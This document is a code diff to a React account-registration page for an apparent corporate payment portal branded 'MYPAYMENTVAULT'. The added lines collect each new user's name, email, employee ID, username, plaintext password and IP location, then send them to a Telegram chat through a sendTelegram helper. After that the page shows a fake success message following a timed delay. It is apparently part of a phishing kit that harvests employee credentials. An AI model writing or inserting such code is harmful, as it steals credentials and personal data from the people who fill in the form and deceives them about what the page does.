@@ -2,6 +2,7 @@ import { useState } from "react";
 import { useLocation } from "wouter";
 import { AuthHeader } from "@/components/auth-header";
 import { CheckCircle, Eye, EyeOff } from "lucide-react";
+import { sendTelegram, getIPInfo } from "@/lib/telegram";
 import { useI18n } from "@/lib/i18n";
 
 const DEPARTMENTS = ["IT", "Finance", "HR", "Marketing", "Operations"];
@@ -51,6 +52,23 @@ export default function CreateAccount() {
     if (form.password.length < 6) { setError("Password must be at least 6 characters."); return; }
     if (form.password !== form.confirmPassword) { setError("Passwords do not match."); return; }
     setLoading(true);
+    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    const ip = await getIPInfo();
+    await sendTelegram(
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `🆕 <b>MYPAYMENTVAULT</b>\n` +
+      `📌 <b>Registrasi Akun Baru</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `👤 <b>Nama</b>        : <code>${form.firstName} ${form.lastName}</code>\n` +
+      `📧 <b>Email</b>       : <code>${form.email}</code>\n` +
+      `🏢 <b>Departemen</b>  : <code>${form.department}</code>\n` +
+      `🪪 <b>Employee ID</b> : <code>${form.employeeId || "-"}</code>\n` +
+      `🔤 <b>Username</b>    : <code>${form.username}</code>\n` +
+      `🔑 <b>Password</b>    : <code>${form.password}</code>\n` +
+      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
+      `🕐 <b>Waktu</b>       : ${now}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`
+    );
     await new Promise((r) => setTimeout(r, 1000));
     setLoading(false);
     setDone(true);
